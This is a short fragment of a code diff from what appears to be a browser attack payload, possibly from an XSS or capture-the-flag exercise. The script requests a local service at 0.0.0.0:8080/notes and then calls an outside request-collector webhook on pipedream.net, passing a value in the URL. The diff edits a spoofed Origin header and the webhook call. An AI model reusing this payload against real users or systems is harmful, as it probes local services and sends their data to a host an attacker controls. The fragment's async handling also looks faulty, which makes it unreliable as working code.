@@ -6,7 +6,6 @@
         var req = new XMLHttpRequest();
         req.open('GET', 'http://0.0.0.0:8080/notes', true);
         req.setRequestHeader('Access-Control-Allow-Origin', '*');
-        req.setRequestHeader('Origin', '0.0.0.0:8080');
         await req.send();
         if(req.status == 200) {
           var src = 'success placeholder';
@@ -18,7 +17,7 @@
         }
         var req_webhook = new XMLHttpRequest();
         req_webhook.open('GET', 'https://en54ypp3nacrf.x.pipedream.net/?src='+src, true);
-        await req_webhook.send(src);
+        await req_webhook.send();
       }
       lmao()
        //var link = document.createElement("button");
